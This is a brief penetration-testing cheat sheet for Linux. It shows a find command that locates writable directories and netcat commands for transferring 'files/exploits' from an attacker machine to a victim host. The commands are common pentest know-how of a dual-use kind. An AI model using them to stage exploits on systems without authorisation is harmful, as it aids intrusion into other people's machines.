## Finding Writeable Directories Sans /tmp or /dev/sum (Linux)
* find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;

## Use netcat to transfer files/exploits
* **Set up your victim to listen for the incoming request and pipe the output to a file**
  * nc -nvlp 8000 > file
* **On attacker machine, send the file**
  * nc victim_ip 8000 < file
